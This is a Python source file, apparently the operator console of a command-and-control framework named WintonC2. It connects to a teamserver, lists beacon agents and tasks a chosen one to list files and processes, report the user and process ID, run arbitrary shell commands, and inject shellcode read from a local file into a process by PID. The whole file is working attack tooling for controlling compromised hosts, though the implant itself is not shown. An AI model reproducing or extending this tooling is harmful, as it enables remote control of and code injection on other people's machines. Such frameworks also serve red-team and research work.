import base64
import json

from Winton.globals import Tasks
from Winton.client import Client
from Winton.standalone import get_task_response

from Utils.print import pretty_print_files, beacon_print, pretty_print, print_agents


def execute_task(client, task: str, args: str =""):
    match task:
        case "ls":
            pretty_print("Tasked beacon to list files in .")
            task_response = get_task_response(client, task)
            files = json.loads(base64.b64decode(task_response["results"][0]["Result"]).decode())
            pretty_print_files(files, client)
        case "whoami":
            pretty_print("Tasked beacon to get current user")
            task_response = get_task_response(client, task)
            beacon_print(client, task_response)
        case "pwd":
            pretty_print("Tasked beacon to get current directory")
            task_response = get_task_response(client, task)
            beacon_print(client, task_response)
        case "ps":
            pretty_print("Tasked beacon to list processes")
            task_response = get_task_response(client, task)
            beacon_print(client, task_response)
        case "getpid":
            pretty_print("Tasked beacon to get current process ID")
            task_response = get_task_response(client, task)
            beacon_print(client, task_response)
        case "shell":
            pretty_print("Tasked beacon to execute shell command")
            task_response = get_task_response(client, task, args)
            beacon_print(client, task_response)
        case "inject":
            pretty_print("Tasked beacon to inject shellcode")
            task_response = get_task_response(client, task, args)
            beacon_print(client, task_response)
        case "help":
            print("\n".join(str(task) for task in Tasks))
        case _:
            print("[!] Invalid command")


def beacon_main_loop(client: Client):
    while True:
        client.refresh_agents()
        print_agents(client.Agent_List)
        beacon_id = input("> ")

        if beacon_id.lower() == "exit":
            break
        elif beacon_id.isdigit():
            beacon_id = int(beacon_id) - 1
            if 0 <= beacon_id < len(client.Agent_List):
                client.choose_agent(beacon_id)
                handle_beacon_interaction(client)
            else:
                print("[!] Invalid agent ID")
        else:
            print("[!] Invalid input")

def handle_help(task_list):
    header = "Command             Description"
    separator = "-------             -----------"

    print("\nWintonC2 Commands\n================\n")
    print(header)
    print(separator)

    for command in task_list:
        name_space = ' ' * (20 - len(command['name']))
        
        line = f"{command['name']}{name_space}{command['description']}"
        print(line)
    
    print("\n")



def handle_beacon_interaction(client: Client):
    while True:
        task = input(f"winton » ")
        if task == "!":
            break

        if task == "help":
            handle_help(Tasks)
        elif task.startswith("shell"):
            execute_task(client, "shell", " ".join(task.split(" ")[1:]))
        elif task.startswith("inject"):
            handle_inject_command(client, task)

        elif task in [task["name"] for task in Tasks]:
            execute_task(client, task)

        else:
            print("[!] Invalid command")

def handle_inject_command(client: Client, task: str):
    parts = task.split(" ")
    if len(parts) != 3:
        print("[!] Usage: inject <PID> <path_to_binfile>")
        return
    pid, binfile = parts[1], parts[2]
    try:
        with open(binfile, "rb") as f:
            shellcode = base64.b64encode(f.read()).decode()
        execute_task(client, "inject", f"{pid} {shellcode}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")

def main():
    TEAMSERVER = "http://127.0.0.1:80"
    client = Client(TEAMSERVER=TEAMSERVER)
    beacon_main_loop(client)

if __name__ == "__main__":
    main()

